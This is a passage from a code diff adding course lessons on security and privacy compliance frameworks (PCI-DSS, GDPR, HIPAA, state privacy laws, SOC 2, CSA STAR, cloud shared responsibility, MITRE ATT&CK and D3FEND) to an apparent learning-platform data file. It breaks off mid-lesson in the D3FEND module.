+      "PCI-DSS v4.0 contains 12 requirements organized into 6 goals for protecting cardholder data",
+      "CVV, full track data, and PINs must never be stored after authorization",
+      "v4.0 introduces the customized approach as an alternative to prescriptive requirements",
+      "MFA is now required for all access to the CDE, not just remote access",
+      "Compliance level determines validation requirements based on transaction volume"
+    ],
+  },
+  { id: "cf-6.2", courseId: "cybersecurity-frameworks", title: "Scoping, SAQs & Compliance Levels", content: `# Scoping, SAQs & Compliance Levels\n\nProper scoping is the most critical step in PCI-DSS compliance. An incorrectly scoped assessment leads to either over-investment or dangerous gaps.\n\n## Scoping the CDE\n\nThe Cardholder Data Environment (CDE) includes:\n- Systems that store, process, or transmit cardholder data\n- Systems connected to or that could impact CDE security\n- Network segments without proper isolation from the CDE\n\n### Scope Reduction Strategies\n\n1. **Network Segmentation** — Isolate CDE from corporate network\n2. **Tokenization** — Replace PAN with non-sensitive tokens\n3. **Point-to-Point Encryption (P2PE)** — Encrypt at the terminal\n4. **Outsourcing** — Use a PCI-compliant payment processor\n5. **Cloud Payment Pages** — Redirect to hosted payment forms\n\n## Self-Assessment Questionnaires (SAQs)\n\n| SAQ Type | Description | Requirements |\n|----------|-------------|-------------|\n| SAQ A | Card-not-present, fully outsourced | 22 questions |\n| SAQ A-EP | E-commerce with website impacting payment | 191 questions |\n| SAQ B | Imprint or standalone dial-out terminals | 41 questions |\n| SAQ C | Payment terminals with internet connection | 160 questions |\n| SAQ D | All other merchants / service providers | 329 questions |\n\n**Choosing the right SAQ:**\n- The simpler your payment processing, the simpler your SAQ\n- SAQ A is the goal — fully outsource payment processing\n- SAQ D is effectively the full PCI-DSS assessment\n\n## Reducing Compliance Burden\n\nThe most effective strategy: **minimize your CDE scope**\n\n\`\`\`\nTraditional (large scope):\n[Corporate Network] ←→ [Payment Processing] ←→ [Card Data Storage]\n     All in scope — SAQ D required\n\nOptimized (minimal scope):\n[Corporate Network] | [Segmented CDE] → [Tokenized Storage]\n                    ↑\n              Hosted Payment Page (SAQ A)\n\`\`\`\n\nBy using hosted payment pages and tokenization, many organizations can reduce from SAQ D (329 questions) to SAQ A (22 questions).`, keyTakeaways: ["Proper scoping is the most critical step in PCI-DSS — it determines your compliance burden", "Scope reduction through segmentation, tokenization, and outsourcing dramatically simplifies compliance", "SAQ types range from A (22 questions, fully outsourced) to D (329 questions, full assessment)", "Hosted payment pages and tokenization can reduce SAQ D to SAQ A", "Every connected system without proper segmentation falls into PCI scope"] },
+  { id: "cf-6.3", courseId: "cybersecurity-frameworks", title: "Network Segmentation & Encryption", content: `# Network Segmentation & Encryption in PCI-DSS\n\nTwo of the most powerful tools for PCI-DSS compliance are network segmentation and encryption. Together they reduce scope and protect cardholder data.\n\n## Network Segmentation\n\nWhile not explicitly required by PCI-DSS, segmentation is strongly recommended because it reduces the scope of the assessment.\n\n### Segmentation Methods\n\n| Method | Description | Effectiveness |\n|--------|-------------|---------------|\n| VLAN + ACLs | Logical separation with access control lists | Moderate |\n| Firewall | Dedicated firewall between CDE and corporate | High |\n| Micro-segmentation | Software-defined, host-level isolation | Very High |\n| Physical Separation | Completely separate network infrastructure | Highest |\n\n### Segmentation Validation\nPCI-DSS v4.0 requires:\n- Penetration testing to verify segmentation effectiveness\n- Testing every 6 months for service providers\n- Testing annually for merchants\n- Documentation of all segmentation controls\n\n## Encryption Requirements\n\n### Data in Transit\n- TLS 1.2 or higher for all cardholder data transmission\n- Strong cipher suites (AES-256-GCM preferred)\n- Certificate validation and pinning where applicable\n- No fallback to insecure protocols\n\n### Data at Rest\n- AES-256 encryption for stored PAN\n- Key management procedures (generation, distribution, rotation)\n- Dual control and split knowledge for encryption keys\n- Keys stored separately from encrypted data\n\n### Key Management\n\`\`\`\nKey Lifecycle:\nGenerate → Distribute → Store → Use → Rotate → Archive → Destroy\n\nKey Rotation: At least annually or upon suspected compromise\nKey Storage: HSM recommended, never stored in plaintext\nAccess: Minimum necessary, documented custodians\n\`\`\`\n\n## Tokenization\n\nTokenization replaces cardholder data with a non-sensitive substitute (token) that has no exploitable value.\n\n**Benefits:**\n- Tokens are useless if breached\n- Dramatically reduces CDE scope\n- Original data stored securely in token vault\n- Reversible only through the tokenization system`, keyTakeaways: ["Network segmentation is the most effective way to reduce PCI-DSS scope", "Segmentation must be validated through penetration testing (annually or semi-annually)", "TLS 1.2+ is mandatory for data in transit; AES-256 for data at rest", "Key management requires dual control, split knowledge, and annual rotation", "Tokenization replaces sensitive data with valueless tokens, dramatically reducing risk and scope"] },
+  { id: "cf-6.4", courseId: "cybersecurity-frameworks", title: "PCI-DSS Audits & Remediation", content: `# PCI-DSS Audits & Remediation\n\nPCI-DSS compliance is validated through assessments, and non-compliance can result in fines, increased transaction fees, and loss of the ability to process card payments.\n\n## Assessment Types\n\n### Qualified Security Assessor (QSA) Audit\n- Required for Level 1 merchants and service providers\n- Conducted by PCI-SSC certified QSA companies\n- Results in a Report on Compliance (ROC)\n- Typically takes 2-4 weeks on-site\n\n### Internal Security Assessor (ISA)\n- Organization's own trained and certified staff\n- Can conduct assessments for Level 2-4 merchants\n- Must pass PCI-SSC ISA certification program\n\n### ASV Scans\n- Quarterly external vulnerability scans by an Approved Scanning Vendor\n- Must achieve a "pass" result (no high vulnerabilities)\n- Required for all compliance levels\n\n## Common Audit Findings\n\n| Finding | Frequency | Remediation |\n|---------|-----------|-------------|\n| Weak passwords / no MFA | Very Common | Deploy password manager + MFA |\n| Missing patches | Very Common | Implement automated patch management |\n| Insufficient logging | Common | Deploy SIEM, ensure 12-month retention |\n| Inadequate segmentation | Common | Implement firewall rules + validation testing |\n| Stored CVV data | Serious | Immediately purge; fix application logic |\n| Unencrypted PAN | Serious | Implement encryption + tokenization |\n\n## Non-Compliance Consequences\n\n- **Fines:** $5,000 - $100,000 per month until compliant\n- **Increased fees:** Higher transaction processing rates\n- **Breach liability:** Full cost of fraudulent transactions\n- **Brand damage:** Public disclosure of non-compliance\n- **Loss of processing:** Payment brands may revoke processing rights\n\n## Remediation Best Practices\n\n1. **Prioritize by risk** — Address critical findings first\n2. **Create a remediation plan** — With owners, timelines, and milestones\n3. **Track progress** — Regular status updates to leadership\n4. **Validate fixes** — Retest after remediation\n5. **Document everything** — Evidence is essential for the next audit\n6. **Continuous compliance** — Don't treat it as an annual event`, keyTakeaways: ["QSA audits are required for Level 1 merchants; quarterly ASV scans for all levels", "Common findings include weak authentication, missing patches, and insufficient logging", "Non-compliance fines range from $5,000-$100,000/month plus breach liability", "Stored CVV data is a critical finding requiring immediate remediation", "Continuous compliance is more effective than annual audit cramming"] },
+
+  // Module 7: Data Privacy
+  { id: "cf-7.1", courseId: "cybersecurity-frameworks", title: "GDPR: Principles & Rights", content: `# GDPR: Principles & Rights\n\nThe General Data Protection Regulation (GDPR) is the European Union's comprehensive data protection law, effective since May 25, 2018. It applies to any organization processing personal data of EU/EEA residents, regardless of where the organization is located.\n\n## The 7 GDPR Principles\n\n| # | Principle | Description |\n|---|-----------|-------------|\n| 1 | Lawfulness, Fairness, Transparency | Process data lawfully with clear communication |\n| 2 | Purpose Limitation | Collect data only for specified, legitimate purposes |\n| 3 | Data Minimization | Collect only what is necessary |\n| 4 | Accuracy | Keep data accurate and up-to-date |\n| 5 | Storage Limitation | Retain data only as long as needed |\n| 6 | Integrity & Confidentiality | Protect data with appropriate security |\n| 7 | Accountability | Demonstrate compliance through documentation |\n\n## Data Subject Rights\n\n1. **Right of Access** — Obtain confirmation and copy of personal data\n2. **Right to Rectification** — Correct inaccurate personal data\n3. **Right to Erasure** (Right to be Forgotten) — Request deletion of personal data\n4. **Right to Restrict Processing** — Limit how data is used\n5. **Right to Data Portability** — Receive data in a structured, machine-readable format\n6. **Right to Object** — Object to processing based on legitimate interests\n7. **Rights Related to Automated Decision-Making** — Not be subject to purely automated decisions with legal effects\n\n## Lawful Bases for Processing\n\n| Basis | Description | Example |\n|-------|-------------|--------|\n| Consent | Freely given, specific, informed | Marketing emails with opt-in |\n| Contract | Necessary for contract performance | Processing a purchase order |\n| Legal Obligation | Required by law | Tax record retention |\n| Vital Interests | Protect someone's life | Emergency medical data sharing |\n| Public Task | Necessary for official authority | Government census |\n| Legitimate Interests | Balanced against data subject rights | Fraud prevention |\n\n## Breach Notification\n\n- **To supervisory authority:** Within 72 hours of becoming aware\n- **To data subjects:** Without undue delay if high risk to rights/freedoms\n- Must include: nature of breach, DPO contact, consequences, remedial measures\n\n## Penalties\n\n- **Tier 1:** Up to €10M or 2% of annual global turnover\n- **Tier 2:** Up to €20M or 4% of annual global turnover\n- **Notable fines:** Meta (€1.2B), Amazon (€746M), WhatsApp (€225M)`, keyTakeaways: ["GDPR applies to any organization processing EU/EEA residents' personal data worldwide", "7 principles govern all data processing: lawfulness, purpose limitation, minimization, accuracy, storage limitation, security, accountability", "Data subjects have 7 rights including access, erasure, portability, and objection", "Breaches must be reported to authorities within 72 hours", "Maximum penalties are €20M or 4% of global annual turnover — whichever is greater"] },
+  { id: "cf-7.2", courseId: "cybersecurity-frameworks", title: "HIPAA Security & Privacy Rules", content: `# HIPAA Security & Privacy Rules\n\nThe Health Insurance Portability and Accountability Act (HIPAA) establishes national standards for protecting health information in the United States. It applies to covered entities (healthcare providers, health plans, healthcare clearinghouses) and their business associates.\n\n## Protected Health Information (PHI)\n\nPHI is any individually identifiable health information, including:\n- Patient names, addresses, dates of birth\n- Medical record numbers, Social Security numbers\n- Diagnoses, treatment information, lab results\n- Insurance information, billing records\n- Any data that can identify a patient + relates to health\n\n**ePHI** = PHI in electronic form\n\n## The HIPAA Security Rule\n\nApplies specifically to ePHI and requires three types of safeguards:\n\n### Administrative Safeguards\n- Risk analysis and risk management\n- Security personnel designation\n- Workforce training and management\n- Information access management\n- Contingency planning\n- Evaluation and review\n\n### Physical Safeguards\n- Facility access controls\n- Workstation use and security\n- Device and media controls\n- Disposal of ePHI media\n\n### Technical Safeguards\n- Access control (unique user IDs, automatic logoff, encryption)\n- Audit controls (recording and examining access to ePHI)\n- Integrity controls (mechanisms to verify ePHI hasn't been altered)\n- Transmission security (encryption during transmission)\n\n## The HIPAA Privacy Rule\n\n- Establishes patient rights over their health information\n- Defines permitted uses and disclosures of PHI\n- Requires minimum necessary standard\n- Mandates Notice of Privacy Practices\n- Grants patients access to their records\n\n## Breach Notification Rule\n\n| Breach Size | Notification Timeline | To Whom |\n|-------------|----------------------|--------|\n| 500+ individuals | Within 60 days | HHS, media, individuals |\n| < 500 individuals | Annual log submission | HHS, affected individuals |\n\n## HIPAA Penalties\n\n| Tier | Knowledge Level | Penalty per Violation | Annual Max |\n|------|----------------|----------------------|------------|\n| 1 | Did not know | $100 - $50,000 | $25,000 |\n| 2 | Reasonable cause | $1,000 - $50,000 | $100,000 |\n| 3 | Willful neglect (corrected) | $10,000 - $50,000 | $250,000 |\n| 4 | Willful neglect (not corrected) | $50,000 | $1.5M |\n\n## Business Associate Agreements (BAAs)\n\nAny vendor handling ePHI must sign a BAA that:\n- Defines permitted uses of PHI\n- Requires appropriate safeguards\n- Mandates breach reporting to the covered entity\n- Ensures subcontractors also comply\n- Specifies data return/destruction on termination`, keyTakeaways: ["HIPAA protects PHI/ePHI through administrative, physical, and technical safeguards", "The Security Rule covers electronic PHI; the Privacy Rule covers all PHI formats", "Breaches affecting 500+ individuals require notification within 60 days to HHS, media, and individuals", "Penalties range from $100 to $50,000 per violation with annual maximums up to $1.5M", "Business Associate Agreements are legally required for all vendors handling ePHI"] },
+  { id: "cf-7.3", courseId: "cybersecurity-frameworks", title: "CCPA, CPRA & Emerging Privacy Laws", content: `# CCPA, CPRA & Emerging Privacy Laws\n\nThe US lacks a single federal privacy law, but states are rapidly enacting their own. The California Consumer Privacy Act (CCPA) and its amendment, the California Privacy Rights Act (CPRA), set the template.\n\n## CCPA/CPRA Overview\n\n**Applies to businesses that:**\n- Have annual gross revenue over $25M, OR\n- Buy/sell/share personal information of 100K+ consumers/households, OR\n- Derive 50%+ of revenue from selling/sharing personal information\n\n**Consumer Rights:**\n1. Right to know what data is collected and how it's used\n2. Right to delete personal information\n3. Right to opt-out of sale/sharing of personal information\n4. Right to non-discrimination for exercising rights\n5. Right to correct inaccurate information (CPRA addition)\n6. Right to limit use of sensitive personal information (CPRA)\n\n**CPRA Additions (effective Jan 2023):**\n- Created the California Privacy Protection Agency (CPPA)\n- Added "sensitive personal information" category\n- Extended data minimization and purpose limitation\n- Strengthened contractor and service provider obligations\n- Added right to opt-out of automated decision-making\n\n## State Privacy Law Landscape (2024-2025)\n\n| State | Law | Effective | Key Feature |\n|-------|-----|-----------|-------------|\n| California | CCPA/CPRA | Jan 2020/2023 | Most comprehensive |\n| Virginia | VCDPA | Jan 2023 | Consent for sensitive data |\n| Colorado | CPA | Jul 2023 | Universal opt-out mechanism |\n| Connecticut | CTDPA | Jul 2023 | Loyalty program protections |\n| Utah | UCPA | Dec 2023 | Business-friendly approach |\n| Texas | TDPSA | Jul 2024 | Broad applicability |\n| Oregon | OCPA | Jul 2024 | Non-profit inclusion |\n| Montana | MCDPA | Oct 2024 | Smallest population threshold |\n| 10+ others | Various | 2024-2026 | Varying requirements |\n\n## Federal Privacy Proposals\n\nSeveral federal privacy bills have been proposed:\n- **ADPPA** (American Data Privacy and Protection Act) — Most advanced\n- **COPRA** (Consumer Online Privacy Rights Act)\n- None have passed as of 2024\n\n## Global Privacy Trends\n\n- **137+ countries** now have data protection laws\n- Cross-border transfer mechanisms (SCCs, BCRs, adequacy decisions)\n- Trend toward stricter consent requirements\n- Children's data receiving enhanced protections globally\n- AI governance increasingly linked to privacy regulation`, keyTakeaways: ["CCPA applies to businesses with $25M+ revenue, 100K+ consumer data, or 50%+ data-selling revenue", "CPRA added sensitive personal information protections and created the CPPA enforcement agency", "15+ US states now have comprehensive privacy laws with varying requirements", "No federal privacy law exists yet, creating a patchwork of state requirements", "137+ countries have data protection laws — global privacy compliance is increasingly complex"] },
+  { id: "cf-7.4", courseId: "cybersecurity-frameworks", title: "Data Protection Impact Assessments", content: `# Data Protection Impact Assessments (DPIAs)\n\nA DPIA is a process to identify and minimize data protection risks of a project or processing activity. GDPR mandates DPIAs for processing that is "likely to result in a high risk" to individuals' rights and freedoms.\n\n## When is a DPIA Required?\n\nA DPIA is mandatory when processing involves:\n- Systematic and extensive profiling with significant effects\n- Large-scale processing of special category data (health, biometrics, etc.)\n- Systematic monitoring of publicly accessible areas\n- New technologies with unknown privacy impacts\n- Automated decision-making with legal effects\n- Large-scale data matching or combining\n- Processing of vulnerable individuals' data (children, employees)\n\n## DPIA Process\n\n### Step 1: Describe the Processing\n- What data is collected and from whom?\n- What is the purpose and legal basis?\n- Who has access to the data?\n- How long is data retained?\n- What systems and technologies are used?\n\n### Step 2: Assess Necessity and Proportionality\n- Is the processing necessary for the stated purpose?\n- Could the purpose be achieved with less data?\n- Is the legal basis appropriate?\n- Are data subjects adequately informed?\n\n### Step 3: Identify and Assess Risks\n\n| Risk | Likelihood | Severity | Overall Risk |\n|------|-----------|----------|-------------|\n| Unauthorized access to personal data | Medium | High | High |\n| Inaccurate profiling decisions | Low | High | Medium |\n| Excessive data retention | Medium | Medium | Medium |\n| Cross-border transfer without safeguards | Low | High | Medium |\n\n### Step 4: Identify Mitigation Measures\n\n| Risk | Mitigation | Residual Risk |\n|------|-----------|---------------|\n| Unauthorized access | Encryption + RBAC + MFA | Low |\n| Inaccurate profiling | Human review process | Low |\n| Excessive retention | Automated deletion policy | Low |\n| Cross-border transfer | Standard Contractual Clauses | Low |\n\n### Step 5: Sign-Off and Documentation\n- DPO review and recommendation\n- Controller sign-off\n- Document the DPIA and store for audit purposes\n- Consult the supervisory authority if high residual risk remains\n\n## Privacy by Design\n\n7 foundational principles (Ann Cavoukian):\n1. Proactive not reactive — prevent rather than remediate\n2. Privacy as the default setting\n3. Privacy embedded into design\n4. Full functionality — positive-sum, not zero-sum\n5. End-to-end security — full lifecycle protection\n6. Visibility and transparency\n7. Respect for user privacy`, keyTakeaways: ["DPIAs are mandatory under GDPR for high-risk processing activities", "The process covers: describe processing, assess necessity, identify risks, plan mitigations, document", "If residual risk remains high after mitigation, consultation with the supervisory authority is required", "Privacy by Design embeds privacy into systems proactively rather than retroactively", "DPIAs should be conducted early in project planning, not after systems are built"] },
+
+  // Module 8: SOC 2 & Cloud
+  { id: "cf-8.1", courseId: "cybersecurity-frameworks", title: "SOC 2 Trust Service Criteria", content: `# SOC 2 Trust Service Criteria\n\nSOC 2 (System and Organization Controls 2) is an auditing framework developed by the AICPA for service organizations. It evaluates an organization's controls relevant to security, availability, processing integrity, confidentiality, and privacy.\n\n## The Five Trust Service Criteria (TSCs)\n\n### 1. Security (Common Criteria) — REQUIRED\nThe foundation — always included in every SOC 2 report.\n- Protection against unauthorized access (physical and logical)\n- Intrusion detection and monitoring\n- Incident response procedures\n- Change management controls\n- Risk assessment processes\n\n### 2. Availability — OPTIONAL\nSystem is available for operation as committed.\n- Uptime monitoring and SLA management\n- Disaster recovery and business continuity\n- Capacity planning\n- Backup and restore procedures\n- Incident communication protocols\n\n### 3. Processing Integrity — OPTIONAL\nSystem processing is complete, valid, accurate, and timely.\n- Data validation and error handling\n- Quality assurance procedures\n- Processing monitoring and reconciliation\n- Output review and verification\n\n### 4. Confidentiality — OPTIONAL\nInformation designated as confidential is protected.\n- Data classification policies\n- Encryption of confidential data\n- Access controls based on classification\n- Secure data disposal procedures\n- NDA and confidentiality agreements\n\n### 5. Privacy — OPTIONAL\nPersonal information is collected, used, retained, and disposed of properly.\n- Privacy notice and consent\n- Choice and consent mechanisms\n- Data subject access requests\n- Disclosure to third parties\n- Data quality and retention\n\n## Common Criteria (CC) Categories\n\nThe Security criteria are organized into 9 categories:\n\n| Category | Focus |\n|----------|-------|\n| CC1 | Control Environment |\n| CC2 | Communication and Information |\n| CC3 | Risk Assessment |\n| CC4 | Monitoring Activities |\n| CC5 | Control Activities |\n| CC6 | Logical and Physical Access |\n| CC7 | System Operations |\n| CC8 | Change Management |\n| CC9 | Risk Mitigation |\n\n## Choosing Your TSCs\n\nMost organizations include:\n- **SaaS companies:** Security + Availability + Confidentiality\n- **Data processors:** Security + Confidentiality + Privacy\n- **Financial services:** Security + Processing Integrity + Availability\n- **Healthcare tech:** All five TSCs`, keyTakeaways: ["SOC 2 evaluates controls across 5 Trust Service Criteria: Security, Availability, Processing Integrity, Confidentiality, Privacy", "Security (Common Criteria) is always required; the other 4 TSCs are optional", "9 Common Criteria categories cover control environment through risk mitigation", "Choose TSCs based on your business model and customer expectations", "SOC 2 is an attestation (not certification) — issued by licensed CPA firms"] },
+  { id: "cf-8.2", courseId: "cybersecurity-frameworks", title: "SOC 2 Type I vs. Type II Audits", content: `# SOC 2 Type I vs. Type II Audits\n\nUnderstanding the difference between Type I and Type II is essential for planning your SOC 2 journey.\n\n## Type I: Point-in-Time\n\n- Evaluates control design at a **specific date**\n- Confirms controls are suitably designed\n- Does NOT test operating effectiveness over time\n- Faster and less expensive\n- Useful as a first step\n\n**Timeline:** 2-4 months to prepare, 2-4 weeks for audit\n\n## Type II: Period of Time\n\n- Evaluates control design AND operating effectiveness\n- Covers a **minimum 3-month period** (typically 6-12 months)\n- Tests that controls were consistently operating\n- More valuable and credible to customers\n- Required by most enterprise customers\n\n**Timeline:** 6-12 months of evidence collection + 4-6 weeks for audit\n\n## Comparison\n\n| Aspect | Type I | Type II |\n|--------|--------|--------|\n| Scope | Design at a point in time | Design + effectiveness over time |\n| Duration | Single date | 3-12 month observation period |\n| Evidence | Policies, configurations | Policies + operational evidence |\n| Cost | Lower ($20K-$50K) | Higher ($30K-$100K+) |\n| Customer Value | Moderate | High |\n| Recommended For | First-time SOC 2 | Ongoing compliance |\n\n## The SOC 2 Journey\n\n\`\`\`\nMonth 1-3: Readiness Assessment\n  └→ Gap analysis against TSCs\n  └→ Remediate critical gaps\n  └→ Implement missing controls\n\nMonth 4: Type I Audit\n  └→ Demonstrate control design\n  └→ Receive Type I report\n\nMonth 5-10: Evidence Collection Period\n  └→ Operate controls consistently\n  └→ Collect evidence continuously\n  └→ Address any control failures\n\nMonth 11-12: Type II Audit\n  └→ Auditor reviews evidence\n  └→ Tests control effectiveness\n  └→ Issues Type II report\n\nOngoing: Annual Type II renewal\n\`\`\`\n\n## Audit Readiness Tips\n\n1. **Automate evidence collection** — Use tools like Drata, Vanta, or Secureframe\n2. **Centralize documentation** — All policies, procedures, and evidence in one place\n3. **Train your team** — Everyone should understand their control responsibilities\n4. **Continuous monitoring** — Don't wait for audit season to check controls\n5. **Pre-audit self-assessment** — Identify issues before the auditor does`, keyTakeaways: ["Type I assesses control design at a point in time; Type II tests effectiveness over a period", "Type II reports are significantly more valuable to customers and partners", "The typical journey: readiness (3mo) → Type I (1mo) → evidence period (6mo) → Type II", "Automation tools like Drata and Vanta dramatically reduce the burden of evidence collection", "Annual Type II renewals are expected once you begin the SOC 2 program"] },
+  { id: "cf-8.3", courseId: "cybersecurity-frameworks", title: "Cloud Security Alliance (CSA) STAR", content: `# Cloud Security Alliance (CSA) STAR\n\nThe CSA Security, Trust, Assurance, and Risk (STAR) program provides a framework for cloud security assurance. It helps cloud customers evaluate provider security through standardized assessments.\n\n## CSA STAR Levels\n\n| Level | Name | Description |\n|-------|------|-------------|\n| 1 | Self-Assessment | Provider completes CAIQ or CCM self-assessment |\n| 2 | Third-Party Audit | Independent assessment (CSA STAR Certification or Attestation) |\n| 3 | Continuous Monitoring | Real-time, continuous assessment (future goal) |\n\n## Cloud Controls Matrix (CCM)\n\nThe CCM is a cybersecurity control framework specifically designed for cloud computing. Version 4.0 contains 197 control objectives across 17 domains:\n\n| Domain | Code | Focus |\n|--------|------|-------|\n| Audit & Assurance | A&A | Audit planning and reporting |\n| Application & Interface Security | AIS | Secure application development |\n| Business Continuity | BCR | Disaster recovery and resilience |\n| Change Control | CCC | Change management processes |\n| Data Security | DSP | Data lifecycle protection |\n| Encryption & Key Mgmt | EKM | Cryptographic controls |\n| Governance & Risk | GRC | Governance and compliance |\n| Human Resources | HRS | Personnel security |\n| Identity & Access | IAM | Authentication and authorization |\n| Infrastructure & Virtualization | IVS | Virtual infrastructure security |\n| Interoperability & Portability | IPY | Data portability and vendor lock-in |\n| Logging & Monitoring | LOG | Security monitoring |\n| Security Incident Mgmt | SEF | Incident response |\n| Supply Chain Mgmt | STA | Third-party risk |\n| Threat & Vulnerability | TVM | Vulnerability management |\n| Universal Endpoint | UEM | Device management |\n\n## Consensus Assessments Initiative Questionnaire (CAIQ)\n\nThe CAIQ is a standardized questionnaire with Yes/No questions based on the CCM. Cloud providers complete it to document their security posture.\n\n**Benefits:**\n- Standardized format reduces vendor assessment fatigue\n- Maps to NIST CSF, ISO 27001, PCI-DSS, and other frameworks\n- Published on the STAR Registry for public review\n- Free to access and use\n\n## STAR Registry\n\nThe public registry at cloudsecurityalliance.org/star lists:\n- Self-assessments (CAIQ responses)\n- Certifications and attestations\n- Provider security posture documentation\n\n**Major providers on the registry:**\nAWS, Microsoft Azure, Google Cloud, Salesforce, ServiceNow, Zoom, and 1,000+ others.`, keyTakeaways: ["CSA STAR provides three levels of cloud security assurance from self-assessment to continuous monitoring", "The Cloud Controls Matrix (CCM) v4.0 covers 197 control objectives across 17 cloud-specific domains", "CAIQ provides standardized vendor questionnaires that map to major frameworks", "The STAR Registry is a free public resource for evaluating cloud provider security", "CSA STAR complements SOC 2 and ISO 27001 with cloud-specific security controls"] },
+  { id: "cf-8.4", courseId: "cybersecurity-frameworks", title: "AWS, Azure & GCP Security Frameworks", content: `# Cloud Provider Security Frameworks\n\nMajor cloud providers operate under a shared responsibility model — they secure the cloud infrastructure while customers secure what they put in it.\n\n## The Shared Responsibility Model\n\n\`\`\`\n┌──────────────────────────────────────────────────────┐\n│              Customer Responsibility                  │\n│  Data, Identity, Application, OS, Network Config     │\n├──────────────────────────────────────────────────────┤\n│             Shared Responsibility                     │\n│  Patch management, configuration, encryption          │\n├──────────────────────────────────────────────────────┤\n│            Cloud Provider Responsibility              │\n│  Physical, Network, Hypervisor, Global Infrastructure│\n└──────────────────────────────────────────────────────┘\n\`\`\`\n\nResponsibility varies by service model:\n\n| Responsibility | IaaS | PaaS | SaaS |\n|---------------|------|------|------|\n| Data classification | Customer | Customer | Customer |\n| Identity & access | Customer | Shared | Shared |\n| Application | Customer | Shared | Provider |\n| OS patching | Customer | Provider | Provider |\n| Network controls | Shared | Provider | Provider |\n| Physical security | Provider | Provider | Provider |\n\n## AWS Security Framework\n\n**AWS Well-Architected Framework — Security Pillar:**\n- Identity and access management (IAM)\n- Detection (CloudTrail, GuardDuty, Security Hub)\n- Infrastructure protection (VPC, Security Groups, WAF)\n- Data protection (KMS, encryption)\n- Incident response (IR runbooks, automated response)\n\n**Key Services:**\n- AWS Security Hub — Centralized security findings\n- Amazon GuardDuty — Threat detection\n- AWS Config — Configuration compliance\n- AWS CloudTrail — API audit logging\n\n## Azure Security Framework\n\n**Microsoft Cloud Security Benchmark (MCSB):**\n- 12 control domains aligned with NIST CSF and CIS Controls\n- Azure Security Center (now Defender for Cloud)\n- Microsoft Sentinel — Cloud-native SIEM\n- Azure Policy — Automated compliance enforcement\n\n## GCP Security Framework\n\n**Google Cloud Security Foundations:**\n- Organization hierarchy and IAM\n- Security Command Center — Threat and vulnerability management\n- Chronicle — Security analytics\n- BeyondCorp — Zero trust access model\n\n## Multi-Cloud Security Considerations\n\n- Each provider has different security services and terminology\n- Unified visibility requires third-party CSPM tools\n- Identity federation across providers is complex but essential\n- Consistent policy enforcement needs cloud-agnostic tooling\n- Cost of security tooling compounds across providers`, keyTakeaways: ["Shared responsibility means the provider secures the cloud; customers secure their workloads", "Responsibility shifts with service model — IaaS gives most control, SaaS gives least", "AWS, Azure, and GCP each have comprehensive security frameworks with different approaches", "Multi-cloud environments require unified visibility and consistent policy enforcement", "Cloud-native security tools should be supplemented with third-party CSPM for cross-cloud coverage"] },
+
+  // Module 9: MITRE ATT&CK for compliance
+  { id: "cf-9.1", courseId: "cybersecurity-frameworks", title: "Mapping Controls to MITRE ATT&CK", content: `# Mapping Controls to MITRE ATT&CK\n\nMITRE ATT&CK is primarily known as a threat intelligence framework, but it's increasingly used to validate security control coverage and identify detection gaps.\n\n## Why Map Controls to ATT&CK?\n\n- **Gap identification** — Find techniques you can't detect\n- **Investment prioritization** — Focus on commonly used techniques\n- **Red team alignment** — Test controls against real adversary behavior\n- **Board reporting** — Show coverage in business-understandable terms\n- **Compliance enrichment** — Add detection context to framework controls\n\n## The Mapping Process\n\n### Step 1: Identify Your Controls\nList all security controls from your framework (NIST CSF, ISO 27001, CIS).\n\n### Step 2: Map to ATT&CK Techniques\nFor each control, identify which ATT&CK techniques it detects, prevents, or mitigates.\n\n**Example Mappings:**\n\n| Control | ATT&CK Technique | Relationship |\n|---------|------------------|-------------|\n| MFA (PR.AA) | T1078 Valid Accounts | Prevents |\n| SIEM Monitoring (DE.CM) | T1059 Command & Scripting | Detects |\n| Network Segmentation (PR.IR) | T1021 Remote Services | Mitigates |\n| Email Filtering (PR.DS) | T1566 Phishing | Prevents |\n| EDR (DE.CM) | T1055 Process Injection | Detects |\n| Backup Testing (RC.RP) | T1486 Data Encrypted for Impact | Recovers |\n\n### Step 3: Visualize Coverage\nUse the ATT&CK Navigator to create a heatmap showing:\n- Green: Techniques with detection/prevention controls\n- Yellow: Techniques with partial coverage\n- Red: Techniques with no coverage (gaps)\n\n### Step 4: Prioritize Gaps\nNot all gaps are equal. Prioritize based on:\n- Frequency of technique use by relevant threat actors\n- Impact if the technique succeeds\n- Cost and feasibility of implementing detection\n\n## ATT&CK Navigator Scoring\n\n\`\`\`\nScore 0: No coverage (red)\nScore 1: Partial detection, log visibility only (orange)\nScore 2: Alert-level detection, may have false positives (yellow)\nScore 3: High-fidelity detection with automated response (green)\nScore 4: Prevention control blocks the technique (blue)\n\`\`\`\n\n## NIST CSF to ATT&CK Mapping\n\nNIST has published official mappings between NIST CSF and ATT&CK:\n- Identify → Reconnaissance, Resource Development\n- Protect → Initial Access, Execution, Persistence, Privilege Escalation\n- Detect → All tactics (detection is cross-cutting)\n- Respond → All tactics (response applies everywhere)\n- Recover → Impact\n\nThis mapping enables organizations to demonstrate that their CSF implementation addresses real-world adversary techniques.`, keyTakeaways: ["Mapping controls to ATT&CK reveals detection gaps against real adversary techniques", "Use ATT&CK Navigator to create visual heatmaps of coverage across all tactics", "Prioritize gaps based on technique prevalence, impact, and remediation feasibility", "Score controls from 0 (no coverage) to 4 (prevention) for each technique", "NIST publishes official CSF-to-ATT&CK mappings for standardized alignment"] },
+  { id: "cf-9.2", courseId: "cybersecurity-frameworks", title: "D3FEND: The Defensive Framework", content: `# MITRE D3FEND: The Defensive Framework\n\nWhile ATT&CK catalogs adversary techniques, D3FEND provides a knowledge graph of cybersecurity countermeasures. It bridges the gap between "what attackers do" and "what defenders can do about it."\n\n## What is D3FEND?\n\nD3FEND (Detection, Denial, and Disruption Framework Empowering Network Defense) is a knowledge base of defensive techniques organized by their relationship to ATT&CK offensive techniques.\n\n## D3FEND Tactics\n\n| Tactic | Purpose | Example Techniques |\n|--------|---------|-------------------|\n| Harden | Reduce attack surface | Application hardening, credential hardening |\n| Detect | Identify adversary activity | Network traffic analysis, process analysis |\n| Isolate | Contain threats | Network isolation, execution isolation |\n| Deceive | Mislead adversaries | Decoy environments, honeypots |\n| Evict | Remove adversary presence | Credential eviction, process eviction |\n\n## D3FEND + ATT&CK Integration\n\n**Example: Defending Against T1566 (Phishing)**\n\n| D3FEND Technique | Category | Implementation |\n|-----------------|----------|---------------|\n| Sender MTA Reputation Analysis | Detect | Email gateway reputation filtering |\n| URL Analysis | Detect | Sandboxed URL detonation |\n| File Content Rules | Detect | YARA 